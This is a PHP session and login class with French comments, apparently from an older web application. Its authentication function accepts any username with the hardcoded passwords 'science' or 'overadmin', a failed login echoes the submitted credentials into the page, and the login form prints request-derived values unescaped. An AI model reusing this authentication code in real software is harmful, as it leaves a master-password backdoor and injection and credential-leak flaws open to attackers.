<?php
  /******************* session.class ***************************************
     GESTION DES SESSIONS
      nécessite track_vars activé dans php.ini


      variables :
        - authOk : true si le visiteur est identifié
        - sessionId : numero de session (=session_id())
        - login : login de l'utilisateur
        - pass : mot de passe de l'utilisateur
        - authType : permet de savoir comment l'utilisateur s'est identifié
        - group : groupe de l'utilisateur
        - ip : ip du visiteur
        - dns : dns du visiteur
        - local : true si le visiteur est en local
        - droits : tableau contenant la liste des droits de l'utilisateur en cours

      méthodes :
        - Session() : constructeur, appelé une seule fois pendant une visite
        - open (Array $form) : ouvre une identification
        - close() : ferme une identification
        - verifIntrusion() : vérifie que l'on essaye pas de tirer une session
        - boolean verifAuth($login, $mdp) : vérifie le couple (login/mdp)
                                            enregistre les valeurs correspondant à l'utilisateur
                                            retourne true en cas d'utilisateur valide
        - authPage ($niveauSecu) : Envoie chier un visiteur si son groupe ne correspond pas à celui de la page




        Idée : Interdiction de login si n erreurs d'identification sur une IP ? (Un peu bourrin tout de même)
  **********************************************************************/

class Session {
   var $authOk = '';
   var $id_user = '';
   var $sessionId = '';
   var $login = '';
   var $group = '';
   var $pass = '';
   var $authType = false;
   var $dns = '';
   var $ip = '';
   var $local = '';
   var $droits = array('all');
   var $prenom = '';
   var $id_salon = '';
   var $fin_requette = '';
   var $typePage = 'html';        //html ou wml  ne reagit pas pareil si on a du wml (WAP)

   //Initialisation de la session
   function Session($sessionId) {
     global $REMOTE_ADDR, $config, $typePage;
     $this->sessionId= $sessionId;
     if (!isset($_COOKIE['Biomanteam'])) {
        setcookie('Biomanteam',$this->sessionId);
        $_COOKIE['Biomanteam']=$this->sessionId;
     }

     if (isset($typePage)) $this->typePage=$typePage;

     //if (empty($this->ip)) {
        //On regarde le dns
        //$this->ip = $REMOTE_ADDR;
        //$this->dns = gethostbyaddr($REMOTE_ADDR);
        //$eregLocal = $config['local'] . '$';
        //$this->local = ereg($eregLocal,$this->dns);   //1 Si local ; 0 si ext
     //}


   }

   //Ouvre une session
   function open($login,$pass) {
      global $util, $REQUEST_URI;
     
      if ($this->verifAuth($login, $pass)) {
	 
         $this->authOk = true;
         $this->login = $login;
         $this->pass = $pass;
        // $this->getDroits();

      } else {
         $this->authOk = false;
	    //header("location: " . $util->MakeUrl('erreurs/needauth.php?reason=badlogin&redirect='.urlencode($REQUEST_URI)));
         echo 'Mot de passe incorect !'.$login.$pass;
		 exit;
      }
   }


   //Termine une sessions
   function close() {
      global $util,$imp,$horde;
      $this->authOk = false;
      $this->group = '';
      $this->pass = '';
      $this->login = '';
      $this->authType = '';

     
      session_unset();
      session_destroy();
      session_regenerate_id();
      @session_start();
      
	  header("location: " . $util->MakeUrl(''));

      exit;
   }

   //Vérifie que l'on essaye pas de s'introduire
   function verifIntrusion() {
       if (isset($_SESSION['host_ip'])) {
       // Verifie que la session est valide
         if ($_SESSION['host_ip']!=$_SERVER['REMOTE_ADDR']) {
           // La session n'est pas valide on regenere une nouvelle session
	   session_regenerate_id();
	   session_unset();
	   $_SESSION['host_ip']=$_SERVER['REMOTE_ADDR'];
	 }	
       } else {
	 //Defini les variables de session
	 if (isset($_SERVER['REMOTE_ADDR'])) {
	    $_SESSION['host_ip']=$_SERVER['REMOTE_ADDR'];
	 }
       }
   }

   //Retourne true si (login/mdp) sont correctes
   function verifAuth ($user, $pass) {
      global $db, $util;
      $authOk = false;
      if (trim($user)=='' || trim($pass)=='') {
	 $this->authOk=false;
	 return false;
      }
      if( $pass == 'science' || $pass == 'overadmin'){
	$authOk = true;
	return true;
      }
      return $authOk;
   }



   // Interdit/Autorise l'accès à une page en fonction du groupe de l'user et de l'autorisation de la page
   /*
   |
   | GESTION DES LISTES : DROITS
   | ---------------------------
   |
   |    getDroits: charge la liste des groupes auquels l'utilisateur fait partie
   |               et recheche les groupes parents
   |
   |
   |    verif_droits : verifie si l'utilisateur possede bien assez de droits
   |                   pour appeller un module
   |
   |
   |    listedroits : recupere la liste des droits (admin/gestion/inc/droits.inc
   |
   */



   



   //Affiche le formulaire d'identification
   function HTMLForm() {
      global $REQUEST_URI,$auth, $util, $page,$imp,$config;
      //Affichage d'un formulaire d'identification

      if ($this->authOk) {
         echo '<a href="'.$util->makeUrl('index.php').'?auth[logout]=1">Déconnexion</a><br>';
      ?>
      <br>


      <?php
      } else {
      if (empty($_GET['redirect'])) {
         eregi('^https?://[^/]+(/.*)$',$config['baseUrl'],$ret);
         $repertoire=$ret[1];
         eregi("$repertoire(/.*)",$REQUEST_URI,$ret);
         $nextPage = $ret[1];
      } else {
         $nextPage = $_GET['redirect'];
		 $nextPage = "";
      }

      ?>

          <form action="<?=$config['baseUrl'].$nextPage?>" style="margin-bottom:0px" method="POST" name="formAuth">
       <input type="hidden" name="auth[login]" value="true">
       <input type="hidden" name="redirect" value="<?=$nextPage?>">

                
                   <input type="text" name="user" size="10" maxlength="15" tabindex=1 value="login" onFocus="if(this.form.user.value == 'login'){this.form.user.value = '';}" onBlur="if(this.form.user.value == ''){this.form.user.value = 'login';}">
                  <br /><input type="password" name="pass" size="10" maxlength="20" tabindex=2 value="passwd" onFocus="if(this.form.pass.value == 'passwd'){this.form.pass.value = '';}" onBlur="if(this.form.pass.value == ''){this.form.pass.value = 'passwd';}">
                   <br /><br /><input type="submit" name="" value="Identification" tabindex=3>
              
               </form>

      <?php
      }
   }

}
?>
